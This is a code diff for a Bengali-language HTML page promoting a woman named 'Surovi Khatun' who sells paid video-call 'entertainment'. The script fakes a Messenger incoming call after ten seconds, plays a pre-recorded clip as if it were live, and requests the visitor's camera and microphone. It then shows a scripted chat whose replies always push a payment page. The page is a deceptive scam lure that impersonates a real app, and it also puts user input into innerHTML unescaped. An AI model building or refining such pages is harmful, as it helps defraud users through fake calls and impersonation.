@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="google" content="notranslate">
-    <!-- Mobile optimization: preventing horizontal scroll and zoom issues -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>সুরভী খাতুন - অফিসিয়াল সার্ভিস</title>
+    <title>সুরভী খাতুন - অফিসিয়াল</title>
     <style>
         :root {
             --primary-red: #ff3b30;
@@ -13,304 +12,223 @@
             --messenger-blue: #0084ff;
         }
 
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             background-color: #f0f2f5;
             margin: 0; padding: 0;
-            overflow-x: hidden;
-            width: 100%;
+            overflow: hidden; width: 100vw; height: 100vh;
         }
 
-        /* Responsive Container */
-        .main-container {
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
+        /* Profile Layout */
         .header {
-            background: white; width: 100%;
-            padding: 20px; text-align: center;
+            background: white; width: 100%; padding: 20px; text-align: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             border-bottom-left-radius: 25px; border-bottom-right-radius: 25px;
         }
 
-        .profile-pic {
-            width: 100px; height: 100px; border-radius: 50%;
-            object-fit: cover; border: 3px solid var(--messenger-blue);
+        .profile-pic { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid var(--messenger-blue); }
+
+        .image-grid { display: flex; gap: 10px; padding: 15px; width: 100%; max-width: 500px; margin: 0 auto; }
+        .sub-img { width: 50%; border-radius: 12px; height: 180px; object-fit: cover; }
+
+        .desc-text { padding: 20px; text-align: center; color: #444; font-size: 15px; line-height: 1.4; }
+
+        .buy-now-btn {
+            background: var(--primary-red); color: white; border: none;
+            padding: 15px 40px; font-size: 18px; font-weight: bold;
+            border-radius: 30px; display: block; margin: 10px auto;
         }
 
-        /* Fixed Image Grid for Mobile */
-        .image-container {
-            display: flex; gap: 10px; padding: 15px; width: 100%;
-        }
-
-        .sub-image {
-            width: 50%; border-radius: 12px; height: 180px; 
-            object-fit: cover; flex-shrink: 0;
-        }
-
-        .description {
-            padding: 20px; text-align: center; color: #444;
-            font-size: 15px; line-height: 1.5;
-        }
-
-        .buy-btn {
-            background-color: var(--primary-red); color: white;
-            border: none; padding: 15px 40px; font-size: 18px;
-            font-weight: bold; border-radius: 30px; cursor: pointer;
-            position: relative; overflow: hidden; margin-bottom: 30px;
-        }
-
-        .buy-btn.animating::after {
-            content: ''; position: absolute; top: 0; left: -100%;
-            width: 100%; height: 100%; background: var(--primary-yellow);
-            animation: fillYellow 2s forwards;
-        }
-
-        @keyframes fillYellow { to { left: 0; } }
-
-        /* Incoming Call UI (Messenger Style) */
+        /* Messenger Call UI */
         #incomingCall {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); z-index: 10000;
-            color: white; text-align: center; padding-top: 80px;
+            background: linear-gradient(to bottom, #1e1e1e, #000); z-index: 10000;
+            color: white; text-align: center; padding-top: 100px;
         }
 
-        .call-action-btn {
-            width: 65px; height: 65px; border-radius: 50%; border: none;
-            cursor: pointer; display: flex; align-items: center; justify-content: center;
-        }
+        .call-btn { width: 65px; height: 65px; border-radius: 50%; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; }
 
-        /* Video Call Interface */
-        #videoInterface {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: black; z-index: 10001;
-        }
-
+        /* Full Screen Video Call */
+        #videoInterface { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 10001; }
         #surviVideo { width: 100%; height: 100%; object-fit: cover; }
+        #userCam { position: absolute; top: 20px; right: 15px; width: 95px; height: 140px; border-radius: 10px; border: 1px solid #ffffff55; object-fit: cover; z-index: 10002; }
+        .hangup-btn { position: absolute; bottom: 50px; left: 50%; transform: translateX(-50%); background: #ff3b30; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 10003; }
 
-        #userCamera {
-            position: absolute; top: 20px; right: 15px;
-            width: 90px; height: 130px; border-radius: 10px;
-            border: 1px solid rgba(255,255,255,0.5); object-fit: cover;
-        }
-
-        .end-call-ui {
-            position: absolute; bottom: 50px; left: 50%; transform: translateX(-50%);
-            background: #ff3b30; width: 65px; height: 65px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; cursor: pointer;
-        }
-
-        /* Chat Head - Center Left */
+        /* Center Left Chat Head */
         #chatHead {
-            display: none; position: fixed; left: 10px; top: 50%;
-            transform: translateY(-50%); z-index: 10002; cursor: pointer;
-            animation: slideIn 0.5s ease-out;
+            display: none; position: fixed; left: 10px; top: 50%; transform: translateY(-50%);
+            z-index: 10005; cursor: pointer;
         }
+        .head-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid white; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        .notif-badge { position: absolute; top: -2px; right: -2px; background: red; color: white; border-radius: 50%; width: 20px; height: 20px; font-size: 11px; display: flex; justify-content: center; align-items: center; border: 2px solid white; }
 
-        @keyframes slideIn { from { left: -100px; } to { left: 10px; } }
-
-        .chat-head-img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .badge { position: absolute; top: -5px; right: -5px; background: red; color: white; border-radius: 50%; width: 22px; height: 22px; font-size: 12px; display: flex; justify-content: center; align-items: center; border: 2px solid white; }
-
-        /* Full Screen Messenger */
-        #messengerUI {
+        /* Full Messenger Overlay */
+        #messengerBox {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 10005; flex-direction: column; color: white;
+            background: #000; z-index: 10010; flex-direction: column; color: white;
         }
-
-        .messenger-header { padding: 15px; display: flex; align-items: center; border-bottom: 0.5px solid #222; }
-        .msg-area { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 12px; }
-        .msg-survi { background: #262626; padding: 12px; border-radius: 18px; align-self: flex-start; max-width: 85%; }
-        .msg-user { background: var(--messenger-blue); padding: 12px; border-radius: 18px; align-self: flex-end; max-width: 80%; }
-        .input-box { padding: 10px; background: #000; display: flex; gap: 10px; align-items: center; }
-        .input-box input { flex: 1; border-radius: 20px; border: none; padding: 12px; background: #1c1c1e; color: white; outline: none; }
-
-        #callEndNotice {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.8); color: white; padding: 15px 30px; border-radius: 30px; z-index: 10002;
-        }
+        .msg-list { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .bubble-survi { background: #262626; padding: 12px; border-radius: 18px; align-self: flex-start; max-width: 85%; }
+        .bubble-user { background: var(--messenger-blue); padding: 12px; border-radius: 18px; align-self: flex-end; max-width: 80%; }
+        .chat-input { padding: 15px; background: #000; display: flex; border-top: 0.5px solid #222; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div class="header">
-            <img src="https://files.catbox.moe/hnc2d4.jpeg" class="profile-pic">
-            <h2 style="margin:10px 0 5px; font-size: 22px;">সুরভী খাতুন</h2>
-            <small style="color: #42b72a; font-weight: bold;">● অনলাইনে আছে</small>
-        </div>
-
-        <div class="image-container">
-            <img src="https://files.catbox.moe/lj7phy.jpeg" class="sub-image">
-            <img src="https://files.catbox.moe/47p5f3.jpeg" class="sub-image">
-        </div>
-
-        <div class="description">
-            <p>আমি <strong>সুরভী খাতুন</strong>। আমি রেগুলার ভিডিও কলে কাজ করে থাকি। আপনার যদি ভিডিও কলে সার্ভিস লাগে তবে আমাকে কল করতে পারেন। সার্ভিস প্রিমিয়াম এবং ভিআইপি।</p>
-        </div>
-
-        <button class="buy-btn" id="mainBuyBtn" onclick="startPayment(this)">সার্ভিস কিনুন</button>
+    <div class="header">
+        <img src="https://files.catbox.moe/hnc2d4.jpeg" class="profile-pic">
+        <h2 style="margin:10px 0 5px;">সুরভী খাতুন</h2>
+        <small style="color: #42b72a; font-weight: bold;">● অনলাইনে আছে</small>
     </div>
 
-    <!-- Incoming Call -->
+    <div class="image-grid">
+        <img src="https://files.catbox.moe/lj7phy.jpeg" class="sub-img">
+        <img src="https://files.catbox.moe/47p5f3.jpeg" class="sub-img">
+    </div>
+
+    <div class="desc-text">
+        আমি সুরভী খাতুন। নিয়মিত ভিডিও কলে সার্ভিস দিয়ে থাকি। আপনার বিনোদনের দায়িত্ব আমার। নির্দ্বিধায় সার্ভিস নিতে পারেন।
+    </div>
+
+    <button class="buy-now-btn" onclick="location.href='payment.html'">সার্ভিস কিনুন</button>
+
+    <!-- Call Alert -->
     <div id="incomingCall">
-        <img src="https://files.catbox.moe/hnc2d4.jpeg" style="width:120px; height:120px; border-radius:50%; margin-bottom:15px; object-fit: cover;">
+        <img src="https://files.catbox.moe/hnc2d4.jpeg" style="width:120px; border-radius:50%; margin-bottom:20px;">
         <h3>সুরভী খাতুন</h3>
-        <p style="color: #ccc;">Messenger Video Call...</p>
-        <div style="display:flex; justify-content:center; gap:60px; margin-top:120px;">
-            <button class="call-action-btn" style="background:#ff3b30;" onclick="declineCall()">
-                <img src="https://cdn-icons-png.flaticon.com/512/6871/6871922.png" width="30" style="filter:invert(1)">
-            </button>
-            <button class="call-action-btn" style="background:#4cd964;" onclick="acceptCall()">
-                <img src="https://cdn-icons-png.flaticon.com/512/8214/8214736.png" width="30" style="filter:invert(1)">
-            </button>
+        <p style="color: #aaa;">Messenger Video Call...</p>
+        <div style="display:flex; justify-content:center; gap:60px; margin-top:100px;">
+            <button class="call-btn" style="background:#ff3b30;" onclick="closeAll()">✖</button>
+            <button class="call-btn" style="background:#4cd964;" id="acceptBtn">✔</button>
         </div>
         <audio id="ringtone" loop src="https://www.soundjay.com/phone/phone-calling-1.mp3"></audio>
     </div>
 
-    <!-- Video Call UI -->
+    <!-- Video UI -->
     <div id="videoInterface">
-        <video id="userCamera" autoplay muted playsinline></video>
-        <video id="surviVideo" playsinline preload="auto"></video>
-        <div class="end-call-ui" onclick="endCallManually()">
+        <video id="userCam" autoplay muted playsinline></video>
+        <video id="surviVideo" playsinline webkit-playsinline></video>
+        <div class="hangup-btn" onclick="endCall()">
             <img src="https://cdn-icons-png.flaticon.com/512/6871/6871922.png" width="30" style="filter:invert(1)">
         </div>
     </div>
 
-    <div id="callEndNotice">Call End</div>
-
     <!-- Chat Head -->
-    <div id="chatHead" onclick="openMessenger()">
-        <img src="https://files.catbox.moe/hnc2d4.jpeg" class="chat-head-img">
-        <div class="badge">1</div>
-        <audio id="msgSound" src="https://files.catbox.moe/8u5x9r.mp3"></audio>
+    <div id="chatHead" onclick="openChat()">
+        <img src="https://files.catbox.moe/hnc2d4.jpeg" class="head-img">
+        <div class="notif-badge">1</div>
     </div>
 
     <!-- Messenger UI -->
-    <div id="messengerUI">
-        <div class="messenger-header">
-            <span style="font-size:28px; cursor:pointer;" onclick="closeMessenger()">‹</span>
-            <img src="https://files.catbox.moe/hnc2d4.jpeg" style="width:35px; height:35px; border-radius:50%; margin:0 12px; object-fit: cover;">
-            <div><b style="font-size:16px;">সুরভী খাতুন</b></div>
+    <div id="messengerBox">
+        <div style="padding: 15px; display: flex; align-items: center; border-bottom: 0.5px solid #222;">
+            <span onclick="closeChat()" style="font-size: 30px; margin-right: 15px; cursor: pointer;">‹</span>
+            <b>সুরভী খাতুন</b>
         </div>
-        <div class="msg-area" id="msgContainer">
-            <div class="msg-survi">
-                <p style="margin: 0 0 10px 0; font-size: 14px;">অডিও মেসেজ পাঠিয়েছে</p>
-                <audio controls src="https://files.catbox.moe/8u5x9r.mp3" style="width:200px; height: 35px;"></audio>
+        <div class="msg-list" id="chatFlow">
+            <div class="bubble-survi">
+                <audio controls src="https://files.catbox.moe/8u5x9r.mp3" style="width:200px; height: 40px;"></audio>
             </div>
         </div>
-        <div class="input-box">
-            <input type="text" id="replyInput" placeholder="Aa">
-            <button style="background:none; border:none; color:var(--messenger-blue); font-weight:bold; font-size:16px;" onclick="userReply()">Send</button>
+        <div class="chat-input">
+            <input type="text" id="userMsg" style="flex:1; background:#222; color:#fff; border:none; border-radius:20px; padding:12px; outline:none;" placeholder="মেসেজ লিখুন...">
+            <button onclick="sendMsg()" style="background:none; border:none; color:var(--messenger-blue); font-weight:bold; padding-left:10px;">Send</button>
         </div>
     </div>
 
     <script>
         const ringtone = document.getElementById('ringtone');
         const surviVideo = document.getElementById('surviVideo');
-        const userCamera = document.getElementById('userCamera');
+        const userCam = document.getElementById('userCam');
+        const acceptBtn = document.getElementById('acceptBtn');
 
-        // Preload video for smoothness
+        // Pre-setup video
         surviVideo.src = "https://files.catbox.moe/4czbh7.mp4";
         surviVideo.load();
 
-        // 10s auto call
+        // 10 Seconds timer to show call
         setTimeout(() => {
             document.getElementById('incomingCall').style.display = 'block';
-            ringtone.play().catch(() => {});
-            if ("vibrate" in navigator) navigator.vibrate([500, 300, 500, 300]);
+            ringtone.play().catch(() => {
+                console.log("Autoplay blocked. Waiting for user interaction.");
+            });
+            if(navigator.vibrate) navigator.vibrate([500, 300, 500]);
         }, 10000);
 
-        async function acceptCall() {
+        // This single click on 'Accept' is enough to trigger video/audio
+        acceptBtn.addEventListener('click', async () => {
             ringtone.pause();
-            ringtone.currentTime = 0;
             document.getElementById('incomingCall').style.display = 'none';
             document.getElementById('videoInterface').style.display = 'block';
 
+            // User camera start
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                userCamera.srcObject = stream;
-            } catch (err) { console.log("Camera access blocked"); }
+                userCam.srcObject = stream;
+            } catch (e) { console.warn("Camera failed"); }
 
+            // Start Survi Video
             surviVideo.play();
-            
-            // Auto end after 10s
-            setTimeout(endCallManually, 10000);
-        }
 
-        function declineCall() {
-            ringtone.pause();
-            document.getElementById('incomingCall').style.display = 'none';
-        }
+            // Auto end call after 10 seconds
+            setTimeout(endCall, 10000);
+        });
 
-        function endCallManually() {
+        function endCall() {
+            // Completely stop video and audio
             surviVideo.pause();
-            surviVideo.src = ""; // Stop buffering and sound completely
-            
-            if(userCamera.srcObject) {
-                userCamera.srcObject.getTracks().forEach(track => track.stop());
+            surviVideo.src = "";
+            surviVideo.load();
+
+            // Stop user cam
+            if(userCam.srcObject) {
+                userCam.srcObject.getTracks().forEach(track => track.stop());
             }
 
             document.getElementById('videoInterface').style.display = 'none';
-            document.getElementById('callEndNotice').style.display = 'block';
-
+            
+            // Show chat head after 2 seconds
             setTimeout(() => {
-                document.getElementById('callEndNotice').style.display = 'none';
-                showChatHead();
+                document.getElementById('chatHead').style.display = 'block';
+                if(navigator.vibrate) navigator.vibrate(200);
+                new Audio('https://www.soundjay.com/button/beep-07.mp3').play();
             }, 2000);
         }
 
-        function showChatHead() {
-            document.getElementById('chatHead').style.display = 'block';
-            if ("vibrate" in navigator) navigator.vibrate(200);
-            // Playing a short notification sound (using audio clip)
-            const audio = new Audio('https://www.soundjay.com/button/beep-07.mp3');
-            audio.play();
-        }
-
-        function openMessenger() {
+        function openChat() {
+            document.getElementById('messengerBox').style.display = 'flex';
             document.getElementById('chatHead').style.display = 'none';
-            document.getElementById('messengerUI').style.display = 'flex';
         }
 
-        function closeMessenger() {
-            document.getElementById('messengerUI').style.display = 'none';
+        function closeChat() {
+            document.getElementById('messengerBox').style.display = 'none';
             document.getElementById('chatHead').style.display = 'block';
         }
 
-        function userReply() {
-            const val = document.getElementById('replyInput').value;
-            if(!val) return;
-
-            const container = document.getElementById('msgContainer');
-            container.innerHTML += `<div class="msg-user">${val}</div>`;
-            document.getElementById('replyInput').value = "";
-            container.scrollTop = container.scrollHeight;
+        function sendMsg() {
+            const txt = document.getElementById('userMsg').value;
+            if(!txt) return;
+            const flow = document.getElementById('chatFlow');
+            flow.innerHTML += `<div class="bubble-user">${txt}</div>`;
+            document.getElementById('userMsg').value = "";
+            flow.scrollTop = flow.scrollHeight;
 
             setTimeout(() => {
-                container.innerHTML += `
-                    <div class="msg-survi">
-                        <audio controls src="https://files.catbox.moe/8u5x9r.mp3" style="width:200px; height:35px;"></audio><br>
-                        <button style="background:var(--primary-yellow); border:none; padding:10px 15px; border-radius:10px; margin-top:10px; font-weight:bold; width:100%;" onclick="location.href='payment.html'">Buy Service Now</button>
+                flow.innerHTML += `
+                    <div class="bubble-survi">
+                        <audio controls src="https://files.catbox.moe/8u5x9r.mp3" style="width:200px; height: 40px;"></audio><br>
+                        <button onclick="location.href='payment.html'" style="background:var(--primary-yellow); border:none; padding:10px; border-radius:10px; font-weight:bold; margin-top:10px; width:100%;">Buy Service</button>
                     </div>`;
-                container.scrollTop = container.scrollHeight;
-                if ("vibrate" in navigator) navigator.vibrate(100);
+                flow.scrollTop = flow.scrollHeight;
+                if(navigator.vibrate) navigator.vibrate(100);
             }, 2000);
         }
 
-        function startPayment(btn) {
-            btn.classList.add('animating');
-            setTimeout(() => { window.location.href = "payment.html"; }, 2000);
+        function closeAll() {
+            ringtone.pause();
+            document.getElementById('incomingCall').style.display = 'none';
         }
     </script>
 </body>
